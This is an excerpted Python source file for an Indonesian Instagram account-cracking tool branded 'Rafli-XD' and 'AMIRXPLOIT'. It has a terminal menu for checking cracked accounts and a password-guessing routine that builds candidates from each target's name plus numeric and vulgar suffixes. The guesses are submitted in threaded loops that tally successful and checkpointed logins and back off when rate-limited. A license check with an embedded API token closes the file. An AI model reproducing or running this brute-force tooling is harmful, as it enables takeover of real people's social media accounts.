...
\t╚═══╩═══╩═══╩╝╚═╩══╩═══╝""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    def logoo(self):
        self.clear()
      #  prints(f"{H2}CRACK INSTAGRAM BY JAKARTA GHOST{reset}")
        prints(Panel(f"""{P2}\t
{P2}\t╔═══╦╗─╔╦═╗╔═╗╔══╦═╗─╔╦═══╦════╦═══╗
\t╚╗╔╗║║─║║║╚╝║║╚╣╠╣║╚╗║║╔═╗║╔╗╔╗║╔═╗║
\t─║║║║║─║║╔╗╔╗║─║║║╔╗╚╝║╚══╬╝║║╚╣║─║║
\t─║║║║║─║║║║║║║─║║║║╚╗║╠══╗║─║║─║╚═╝║
\t╔╝╚╝║╚═╝║║║║║║╔╣╠╣║─║║║╚═╝║─║║─║╔═╗║
\t╚═══╩═══╩╝╚╝╚╝╚══╩╝─╚═╩═══╝─╚╝─╚╝─╚╝\n\t{P2}        CRACK INSTAGRAM BY AMIRXPLOIT.""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
 ...
 #           self.bots()        
    ...
    def lains(self):
        prints(Panel(f"{P2}[{color_rich}01{P2}]. Check Akun Hasil Crack     {P2}[{color_rich}03{P2}]. Settting UserAgent\n{P2}[{color_rich}02{P2}]. Gabung Group WhatsApp Rafli-XD      {P2}[{color_rich}04{P2}]. Ambil UserAgent",width=80,padding=(0,7),style=f"{color_table}"))
        prints(Panel(f"{P2}[{color_rich}05{P2}]. Lihat Jumlah Pengguna Script Rafli-XD\n{P2}[{color_rich}06{P2}]. Ganti Warna Tema Tools Rafli-XD",width=80,padding=(0,13),style=f"{color_table}"))
...
{N}[{H}+{N}] {H}•• LIVE ••{N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
                ...
                for user in self.id:
                    ...
                    for pasw in nama.split(" "):
                        if len(pasw)==3 or len(pasw)==4 or len(pasw)==5:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw+"kontol", pasw+"memek", pasw+"anjing", pasw.lower()]
                        else:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw+"kontol", pasw+"memek", pasw+"anjing", pasw.lower()]
                        if 'satu' in method:
                           ...
                           bool.submit(self.Ngocok, usez, sandi)
            print("\r")
            prints(Panel(f" {P2}Rafli-XD {color_rich}{len(self.id)} {P2}Username Selesai Hasil OK : {H2}{len(self.ok)}{P2} Hasil CP : {K2}{len(self.cp)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
            time.sleep(3);exit()
    ...
    def crakersAPI(self, user, pasw):
        prog.update(des,description=f"[{H2} Rafli-XD {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                   ...
                   prog.update(des,description=f"[{M2} Rafli-XD {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                   time.sleep(31)
                   self.crakersAPI(self, user, pasw)
        self.lo+=1
    ...
    def Ngocok(self, user, pasw):
        ...
        prog.update(des,description=f" Rafli-XD ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
             ...
             #       os.popen('play-audio raycp.mp3')
                    ...
                    prog.update(des,description=f"Rafli-XD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"Rafli-XD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                prog.advance(des)
...
try:lisen = open('data/lisensi.txt','r').read()
            met = self.ses.get('https://app.cryptolens.io/api/key/Activate?token=WyI0MjI3NDQ4NCIsImM2RVVBYlRKWXh0WnBVRzFFT1MyYTBxQ2hQVFFIczN1RThMQ21hYlAiXQ==&ProductId=19411&Key='+lisen).json()
            men = met['licenseKey']
            key = men['key'][0:11]
            tahun = men['expires'][0:4]
